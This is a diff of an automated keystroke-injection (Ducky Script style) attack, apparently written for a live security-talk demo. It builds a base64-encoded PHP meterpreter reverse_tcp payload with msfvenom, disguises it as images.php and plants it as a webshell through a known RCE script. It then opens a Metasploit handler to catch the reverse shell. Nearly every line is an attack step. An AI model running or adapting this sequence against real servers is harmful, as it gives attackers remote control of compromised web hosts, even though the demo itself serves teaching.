@@ -1,64 +1,67 @@
-DELAY 2000
+DELAY 5000
 ALT F2
-DELAY 400
+DELAY 500
 STRING gnome-terminal
-DELAY 400
+DELAY 500
 ENTER
-DELAY 400
+DELAY 500
 STRING /usr/bin/wmctrl -r :ACTIVE: -b add,fullscreen
-DELAY 400
+DELAY 500
 ENTER
-DELAY 400
+DELAY 500
 STRING #[INFO] Hello, let's setup the webserver exploitation :)
-DELAY 400
 ENTER
-DELAY 400
+ENTER
+ENTER
+DELAY 500
+ENTER
+DELAY 500
 STRING cd /home/dbusby/Documents/Projects/Github/talks/Security_and_why_you_need_to_review_yours/compromise
-DELAY 400
+DELAY 500
 ENTER
-DELAY 400
+DELAY 500
 STRING /bin/echo '<?PHP' > images.php
 ENTER
-DELAY 400
+DELAY 500
 STRING /usr/bin/msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.33.1 -e php/base64 -f raw  >> images.php
-DELAY 400
+DELAY 500
+ENTER
+DELAY 10000
+STRING /bin/echo '?>' >> images.php
+DELAY 500
+ENTER
+DELAY 500
+STRING #[INFO] Ok, we have setup the php meterpreter payload now we need to get this on the webserver
+DELAY 500
+ENTER
+DELAY 500
+STRING #[INFO] We just so happen to know of an existing RCE vulnerability on the site so let's use that :)
+DELAY 500
+ENTER
+STRING #[INFO] OK you asked for it ... here we go...
 ENTER
 DELAY 5000
-STRING /bin/echo '?>' >> images.php
-DELAY 400
-ENTER
-DELAY 400
-STRING #[INFO] Ok, we have setup the php meterpreter payload now we need to get this on the webserver
-DELAY 400
-ENTER
-DELAY 400
-STRING #[INFO] We just so happen to know of an existing RCE vulnerability on the site so let's use that :)
-DELAY 400
-ENTER
-STRING #[INFO] OK you asked for it ... here goes
-ENTER
-DELAY 1000
 STRING ./stage_webshell.sh
-DELAY 400
+DELAY 500
 ENTER
 DELAY 5000
 STRING /usr/bin/msfconsole
-DELAY 400
+DELAY 500
 ENTER
-DELAY 15000
+DELAY 20000
 STRING use multi/handler
-DELAY 400
+DELAY 500
 ENTER
 DELAY 2000
 STRING set PAYLOAD php/meterpreter/reverse_tcp
-DELAY 400
+DELAY 500
 ENTER
 DELAY 1000
 STRING set LHOST 172.16.33.1
-DELAY 400
+DELAY 500
 ENTER
 DELAY 1000
 STRING exploit
-DELAY 400
+DELAY 500
 ENTER
 
